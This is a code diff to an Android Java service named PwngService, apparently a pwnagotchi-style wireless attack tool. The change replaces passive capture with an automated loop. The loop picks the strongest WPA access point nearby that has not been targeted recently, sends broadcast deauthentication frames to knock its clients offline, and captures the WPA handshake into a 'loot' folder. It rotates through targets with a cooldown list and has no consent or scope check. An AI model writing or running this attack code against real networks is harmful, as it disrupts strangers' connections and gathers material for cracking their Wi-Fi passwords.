@@ -33,6 +33,9 @@ public class PwngService extends Service {
     private String currentPhase = "BOOT";
     private int apCount = 0, wpa2Count = 0;
     private int totalPmkids = 0, totalHandshakes = 0;
+    private Set<String> recentTargets = new HashSet<>();
+    private int cycleCount = 0;
+    private static final int TARGET_COOLDOWN = 50; // cycles before clearing blacklist
     private long sessionStart;
     private volatile boolean isRunning = false;
     private String lootDir, ourMac = "000000000000";
@@ -221,23 +224,33 @@ public class PwngService extends Service {
 
         boolean success = false;
         
-        // Passive handshake capture in monitor mode (no evil twin needed!)
-        if (monitorReady && monitor != null && monitor.isEnabled() && d.targetBssid != null) {
-            brain.currentStatus = "📡 listening on " + (d.targetSsid != null ? d.targetSsid : d.targetBssid);
-            updateNotification();
-            String hs = monitor.captureHandshake(lootDir, d.targetBssid, 20);
-            if (hs != null) {
-                totalHandshakes++;
-                success = true;
-                brain.currentStatus = "💀 handshake! " + d.targetSsid;
-            } else {
-                // No handshake yet — random deauth to force reconnection
-                if (rng.nextInt(100) < 30 && d.targetBssid != null) {  // 30% chance
-                    String ch = getChanForBssid(d.targetBssid, scanData);
-                    int chan = ch != null ? Integer.parseInt(ch) : 6;
-                    monitor.deauth(d.targetBssid, "ff:ff:ff:ff:ff:ff", chan);
-                    brain.currentStatus = "👊 deauth " + d.targetSsid;
+        // Deauth + capture on the strongest WPA2 AP found (rotate targets)
+        if (monitorReady && monitor != null && monitor.isEnabled() && scanData.size() > 0) {
+            cycleCount++;
+            // Clear cooldown every N cycles
+            if (cycleCount % TARGET_COOLDOWN == 0) recentTargets.clear();
+            
+            // Find strongest WPA2 AP not recently attacked
+            String bestBssid = null, bestSsid = "?"; 
+            int bestChan = 6, bestSig = -999;
+            for (String[] ap : scanData) {
+                if (!ap[4].contains("WPA")) continue;
+                if (recentTargets.contains(ap[0])) continue;
+                int sig = 0;
+                try { sig = Integer.parseInt(ap[3]); } catch (Exception e) {}
+                if (sig > bestSig) { bestSig = sig; bestBssid = ap[0]; bestSsid = ap[1]; 
+                    try { bestChan = Integer.parseInt(ap[2]); } catch (Exception e) { bestChan = 6; }
                 }
+            }
+            
+            if (bestBssid != null) {
+                recentTargets.add(bestBssid);
+                monitor.deauth(bestBssid, "ff:ff:ff:ff:ff:ff", bestChan);
+                brain.currentStatus = "👊 deauth " + bestSsid + " (rssi:" + bestSig + ")";
+                updateNotification();
+                try { Thread.sleep(2000); } catch (Exception e) {}
+                String hs = monitor.captureHandshake(lootDir, bestBssid, 15);
+                if (hs != null) { totalHandshakes++; success = true; brain.currentStatus = "💀 handshake! " + bestSsid; }
             }
         }
         
